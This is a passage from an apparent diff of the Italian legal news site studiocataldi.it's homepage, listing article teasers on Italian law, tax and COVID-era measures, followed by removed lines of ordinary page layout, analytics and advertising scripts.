href="https://www.studiocataldi.it/articoli/38235-compensi-avvocati-prevale-l-accordo-col-cliente.asp">Compensi avvocati: prevale l'accordo col cliente</a></h2><p>La Cassazione chiarisce in materia di compensi a prevalere è l'accordo tra avvocato e cliente, seguono poi a ruota, tariffe, usi e decisione giudiziale</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38235-compensi-avvocati-prevale-l-accordo-col-cliente.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/37703-decreto-cura-italia.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/conte-decreto-cura-italia.-id37703.jpeg" alt="Decreto &quot;Cura italia&quot;: tutte le misure" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/37703-decreto-cura-italia.asp">Decreto &quot;Cura italia&quot;: tutte le misure</a></h2><p>Approvato definitivamente il Decreto &quot;Cura Italia&quot; che introduce misure a sostegno di famiglie, lavoratori e imprese per contrastare gli effetti sull'economia provocati dall'emergenza COVID-19</p><a class='read-more' href="https://www.studiocataldi.it/articoli/37703-decreto-cura-italia.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38279-focaroli-quotassurdo-negare-incontro-genitori-figli-in-case-famiglia-quot.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/giudice-focaroli-roma.-id38279.jpeg" alt="Focaroli: &quot;Assurdo negare incontro genitori-figli in case famiglia&quot;" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38279-focaroli-quotassurdo-negare-incontro-genitori-figli-in-case-famiglia-quot.asp">Focaroli: &quot;Assurdo negare incontro genitori-figli in case famiglia&quot;</a></h2><p>È avvilente e paradossale che non sia stato considerato un &quot;diritto essenziale&quot; quello del mantenere e salvaguardare il rapporto genitori e figli a qualsiasi livello ed in qualsiasi condizione famigliare</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38279-focaroli-quotassurdo-negare-incontro-genitori-figli-in-case-famiglia-quot.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38278-def-2020-la-finanza-pubblica.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/spread-finanza-borsa-soldi-mercato-id30641.jpg" alt="Def 2020: la finanza pubblica" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38278-def-2020-la-finanza-pubblica.asp">Def 2020: la finanza pubblica</a></h2><p>Gli obiettivi programmatici di finanza pubblica del Documento di Economia e Finanza 2020 (Def 2020) approvato dal Consiglio dei Ministri</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38278-def-2020-la-finanza-pubblica.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/27384-ape-social-che-cos-e-e-come-funziona.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/lavoratore_uomo_trasferimento_licenziamento-id26852.jpg" alt="Ape social: che cos'è e come funziona" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/27384-ape-social-che-cos-e-e-come-funziona.asp">Ape social: che cos'è e come funziona</a></h2><p>L'Ape social è una misura previdenziale sperimentale, introdotta nel 2017 e prorogata sino al 31 dicembre 2020, che consente l'uscita anticipata dal lavoro</p><a class='read-more' href="https://www.studiocataldi.it/articoli/27384-ape-social-che-cos-e-e-come-funziona.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38217-violazione-dei-dati-gestione-di-reclami-e-data-breach.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/data-breach-lucchetto-privacy-sicurezza-id38217.jpg" alt="Violazione dei dati: gestione di reclami e data breach" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38217-violazione-dei-dati-gestione-di-reclami-e-data-breach.asp">Violazione dei dati: gestione di reclami e data breach</a></h2><p>Alla luce dei recenti provvedimenti assume grande importanza il ruolo del garante nella gestione dei reclami e delle procedure di data breach</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38217-violazione-dei-dati-gestione-di-reclami-e-data-breach.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/28983-blockchain-cos-e-e-come-puo-influenzare-le-professioni-legali.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/bitcoin_uomo_futuro-id28583.jpg" alt="Blockchain: cos'è e come funziona" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/28983-blockchain-cos-e-e-come-puo-influenzare-le-professioni-legali.asp">Blockchain: cos'è e come funziona</a></h2><p>La Blockchain è un database che gestisce dati e informazioni relative a transazioni in maniera trasparente e sicura senza bisogno di un’autorità esterna</p><a class='read-more' href="https://www.studiocataldi.it/articoli/28983-blockchain-cos-e-e-come-puo-influenzare-le-professioni-legali.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38274-le-liberta-dimenticate-ai-tempi-del-covid.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/scrittore-id38274.jpg" alt="Le libertà dimenticate ai tempi del Covid" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38274-le-liberta-dimenticate-ai-tempi-del-covid.asp">Le libertà dimenticate ai tempi del Covid</a></h2><p>Quando dalla discrezionalità si sconfina nell'arbitro s'inibiscono irragionevolmente diritti fondamentali</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38274-le-liberta-dimenticate-ai-tempi-del-covid.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38236-calcolo-ravvedimento-operoso.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/tasse-taglio-fisco-id36998.jpg" alt="Calcolo ravvedimento operoso" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38236-calcolo-ravvedimento-operoso.asp">Calcolo ravvedimento operoso</a></h2><p>Cosa deve pagare chi sceglie di optare per il ravvedimento operoso e come si calcolano gli interessi e le sanzioni da applicare in misura ridotta</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38236-calcolo-ravvedimento-operoso.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38248-subappalto-e-fallimento.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/scacchi-re-mediazione-fallimento-id34134.jpg" alt="Subappalto e fallimento" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38248-subappalto-e-fallimento.asp">Subappalto e fallimento</a></h2><p>Riflessioni giuridiche sul tema del subappalto e del fallimento sulla base di una recente sentenza delle sezioni unite della Cassazione</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38248-subappalto-e-fallimento.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38218-opzione-donna-quanto-si-perde.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/banconote-soldi-calcolatrice-id36034.jpg" alt="Opzione donna: quanto si perde" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38218-opzione-donna-quanto-si-perde.asp">Opzione donna: quanto si perde</a></h2><p>Chi sceglie di aderire all'opzione donna deve accettare anche una riduzione permanente del proprio assegno pensionistico, in alcuni casi significativa</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38218-opzione-donna-quanto-si-perde.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/25676-tari-la-guida-completa.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/rifiuti_cestini_riciclaggio-id25676.jpg" alt="Tari: la tassa sui rifiuti, guida completa" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/25676-tari-la-guida-completa.asp">Tari: la tassa sui rifiuti, guida completa</a></h2><p>La Tari è una tassa comunale destinata a finanziare i costi del servizio di raccolta e smaltimento dei rifiuti a carico dell’utilizzatore</p><a class='read-more' href="https://www.studiocataldi.it/articoli/25676-tari-la-guida-completa.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/12949-il-reato-di-stalking.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/stalking-id8697.jpg" alt="Stalking: il reato di &quot;atti persecutori&quot;" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/12949-il-reato-di-stalking.asp">Stalking: il reato di &quot;atti persecutori&quot;</a></h2><p>Lo stalking consiste in condotte persecutorie ripetute che incidono sulle abitudini di vita della vittima o generano un grave stato di ansia o di paura</p><a class='read-more' href="https://www.studiocataldi.it/articoli/12949-il-reato-di-stalking.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div>
-<div class="clear"></div>
-
-<input type="hidden" id="pageNum" value="1" NAME="pageNum" />
-<div id="moreNews" style="vertical-align:top"></div>
-<div class="clear"></div>
-<div id="showMoreLink" style="text-align:center;width:155px;margin: 20px auto 0px auto;background:#1c344c;height: 31px;line-height: 31px;">
-<a href="javascript:void(0)" onclick="showMoreNews()" style="text-decoration:none;color:White;">Mostra altri articoli</a>
-</div>
-<div id="archivio" style="text-align:center;width:200px;margin: 20px auto 0px auto;visibility:hidden;display:none;background-color:#1c344c;">
-<a href="https://www.studiocataldi.it/seenews_pag1.asp#archivioperdata" style="text-decoration:none;color:White;">Vai all'archivio per data</a>
-</div>
-<div id="loadingDiv" style="visibility:hidden;display:none"><img src="https://www.studiocataldi.it/images/loading.gif" alt="caricamento" /></div>
-<script>
-	var pageNumMax = 4;
-function showMoreNews(){
-	document.getElementById('showMoreLink').style.visibility = "hidden";
-	document.getElementById('showMoreLink').style.display = "none";
-	document.getElementById('loadingDiv').style.visibility = "visible";
-	document.getElementById('loadingDiv').style.display = "block";
-	var pageNum = document.getElementById('pageNum').value;	
-	pageNum = parseInt(pageNum)+1;
-	$.ajax({
-		type: "POST",
-		url: "/include/altro/home/index-show-more-2020.asp",
-		data: "action=showMoreNews&pageNum=" + encodeURIComponent(pageNum),
-		success: function (content) {
-			document.getElementById('loadingDiv').style.visibility = "hidden";
-			document.getElementById('loadingDiv').style.display = "none";
-			var newDiv = document.createElement('div');
-			document.getElementById('moreNews').appendChild(newDiv);
-			newDiv.innerHTML = content;
-			if (pageNum <= pageNumMax) {
-				document.getElementById('showMoreLink').style.visibility = "visible";
-				document.getElementById('showMoreLink').style.display = "block";
-			} else {
-				document.getElementById('archivio').style.visibility = "visible";
-				document.getElementById('archivio').style.display = "block";
-			}
-			document.getElementById('pageNum').value = pageNum;
-		}
-	})	
-}
-</script>
-<div class="clear"></div>
-</section>
-<aside>
-<div class="right-section-block">
-
-<a href="https://www.studiocataldi.it/newsletter.asp" class="newsletter-btn"><div class="newsletter-btn-arrow"></div><div class="newsletter-btn-text">Newsletter Giuridica</div></a>
-<br /><br />
-</div>
-<div class="right-section-block">
-<div style="width: 300px; height: 250px;margin-bottom:8px">
-<div id='div-gpt-ad-1553009470984-0' style='height: 250px; width: 300px;'>
-<div id="banner-home-destra"></div>
-</div>
-</div>
-</div>
-<div class="right-section-block">
-<div class="right-section-header">
-<p><b>Rubriche di diritto:</b></p>
-</div>
-<a href="https://www.studiocataldi.it/lawinaction/">
-<img src="https://www.studiocataldi.it/images/storani-120.jpg" style="float:left;margin-right:8px" width="100px">Law In Action - di Paolo Storani</a>
-<br clear="all"><br>
-<div class="most-read-right-menu-separator"></div>
-<a href="https://www.studiocataldi.it/rubrica-famiglia-e-diritto-di-matteo-santini/">
-<img src="https://www.studiocataldi.it/images/diritto-di-famiglia230.png" style="float:left;margin-right:8px" width="100px">Diritto di famiglia - di Matteo Santini</a>
-<br clear="all"><br>
-<div class="most-read-right-menu-separator"></div>
-<a href="https://www.studiocataldi.it/diritto-economia/">
-<img src="https://www.studiocataldi.it/images/dirittoeconomia120.png" style="float:left;margin-right:8px" width="100px">Diritto ed Economia - di Roberto Paternic&ograve;</a><br>
-<br clear="all"><br>
-<div class="right-section-header">
-<p><b>Più lette:</b></p>
-</div>
-<a href="https://www.studiocataldi.it/articoli/12949-il-reato-di-stalking.asp" title="Stalking: il reato di &quot;atti persecutori&quot;"><b>1.</b>&nbsp;Stalking: il reato di &quot;atti persecutori&quot;</a><br /><div class="most-read-right-menu-separator"></div><a href="https://www.studiocataldi.it/articoli/37703-decreto-cura-italia.asp" title="Decreto &quot;Cura italia&quot;: tutte le misure"><b>2.</b>&nbsp;Decreto &quot;Cura italia&quot;: tutte le misure</a><br /><div class="most-read-right-menu-separator"></div><a href="https://www.studiocataldi.it/articoli/23069-crowdfunding-cos-e-e-come-funziona.asp" title="Crowdfunding: cos'è e come funziona"><b>3.</b>&nbsp;Crowdfunding: cos'è e come funziona</a><br /><div class="most-read-right-menu-separator"></div><a href="https://www.studiocataldi.it/articoli/21060-il-processo-minorile.asp" title="Il processo minorile"><b>4.</b>&nbsp;Il processo minorile</a><br /><div class="most-read-right-menu-separator"></div><a href="https://www.studiocataldi.it/articoli/27384-ape-social-che-cos-e-e-come-funziona.asp" title="Ape social: che cos'è e come funziona"><b>5.</b>&nbsp;Ape social: che cos'è e come funziona</a><br /><div class="most-read-right-menu-separator"></div>
-</div>
-<div class="fixedfloatdiv" style='height:600px; width:300px;'>
-<div id="sticky-home"></div>
-</div>
-<div class="clear"></div>
-</aside>
-</main>
-<footer>
-<div class="footer-content">
-<ul>
-<li><a href="https://www.studiocataldi.it/contattaci.asp">Contatti</a></li>
-<li><a href="https://www.studiocataldi.it/laredazione/">La redazione</a></li>
-<li><a href="https://www.studiocataldi.it/pubblicita.asp">Pubblicit&agrave;</a></li>
-<li><a href="https://www.studiocataldi.it/newstuosito.asp">News per il tuo sito</a></li>
-<li><a href="https://www.studiocataldi.it/feed_rss.asp">Feed rss</a></li>
-<li><a href="https://www.studiocataldi.it/network-assistenza-legale/">Network assistenza</a></li>
-<li><a href="https://www.studiocataldi.it/consulenza-legale/">Consulenza legale</a></li>
-</ul>
-<div class="clear"></div>
-&copy; Copyright 2001 - 2020 Studiocataldi.it - Quotidiano giuridico<br><a href="https://www.studiocataldi.it/informativa-privacy.asp">Informativa sulla privacy</a> - P.I. 02324600440
-<div class="clear"></div>
-</div>
-</footer>
-<div class="clear"></div>
-<br><br>
-
-<script>
-    _atrk_opts = { atrk_acct: "lTiVm1aMp4Z37i", domain: "studiocataldi.it", dynamic: true };
-    (function () { var as = document.createElement('script'); as.type = 'text/javascript'; as.async = true; as.src = "https://d31qbv1cthcecs.cloudfront.net/atrk.js"; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(as, s); })();
-</script>
-<noscript><img src="https://d5nxst8fruw4z.cloudfront.net/atrk.gif?account=lTiVm1aMp4Z37i" style="display:none" height="1" width="1" alt="" /></noscript>
-
-<script async src="https://www.studiocataldi.it/cookiechoices.js?v=1.15"></script>
-<script>
-    (function (i, s, o, g, r, a, m) {
-        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
-            (i[r].q = i[r].q || []).push(arguments)
-        }, i[r].l = 1 * new Date(); a = s.createElement(o),
-  m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
-    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
-
-    ga('create', 'UA-183090-1', 'auto');
-    ga('require', 'displayfeatures')
-    ga('send', 'pageview');
-
-</script>
-<div id="most-read-dif">
-</div>
-<script>
-    document.getElementById("most-read").appendChild(document.getElementById("most-read-dif"));
-</script>
-<script src="https://www.studiocataldi.it/js/jquery-3.4.1.min.js"></script>
-<script src="https://www.studiocataldi.it/js/jquery.lazyload.js"></script>
-<script>
-    $(function () {
-        $("img.lazy").lazyload();
-    });
-    function lazyLoadMostRead() {
-        $("img.lazyMostRead").lazyload();
-    }
-</script>
-<div id="banner-home-destra-dif">
-<script async src='https://www.googletagservices.com/tag/js/gpt.js'></script>
-<script>
-            var w = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
-            if (w >= 880) {
-                var googletag = googletag || {};
-                googletag.cmd = googletag.cmd || [];
-
-                googletag.cmd.push(function () {
-                    googletag.defineSlot('/5844173/studiocataldi_sitebar_atf_300x250_desktop_tablet', [300, 250], 'div-gpt-ad-1553009470984-0').addService(googletag.pubads());
-                    googletag.enableServices();
-                    googletag.pubads().enableAsyncRendering();
-                    googletag.display('div-gpt-ad-1553009470984-0');
-                });
-            }
-            </script>
-</div>
-<script>
- $(function () {
-    document.getElementById("banner-home-destra").appendChild(document.getElementById("banner-home-destra-dif"));
-    });
-</script>
-<div id="sticky-home-dif">
-
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-
-<ins class="adsbygoogle" style="display:inline-block;width:300px;height:600px" data-ad-client="ca-pub-7966962822806303" data-ad-slot="3646932638"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-</div>
-<script>
-    $(function () {
-        document.getElementById("sticky-home").appendChild(document.getElementById("sticky-home-dif"));
-    });
-</script>
-<script>
-    window.onscroll = function () { scrollFunction() };
-
-    function scrollFunction() {
-        var w = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
-        var scroll = document.body.scrollTop || document.documentElement.scrollTop;
-        var bannerObj = $('#sticky-home-dif');
-        if (w > 880) {
-            if (bannerObj) {
-                if (scroll > 1250) {
-                    bannerObj.addClass("sticky-home-dif-active");
-                } else {
-                    bannerObj.removeClass("sticky-home-dif-active");
-                }
-                //console.log("scroll"+scroll);
-                var h = document.body.scrollHeight || document.documentElement.scrollHeight;
-                //console.log("h"+h);
-                if (scroll + 600 + 150 > h) {
-                    var offset = h - (scroll + 600 + 150);
-                    document.getElementById("sticky-home-dif").style.marginTop = offset + "px";
-                } else {
-                    document.getElementById("sticky-home-dif").style.marginTop = 0;
-                }
-            }
-        }
-    }
-
-</script>
-<script async src="//clickio.mgr.consensu.org/t/consent_205873.js"></script>
-<script async id="__clickio__safecontent__" data-sid="205873" src="//s.clickiocdn.com/t/safecontent.js"></script>
-<script async id="__lxGc__rtr" src="//s.clickiocdn.com/t/205873/360_light.js"></script>
-</body>
+        
+    </body>
 </html>
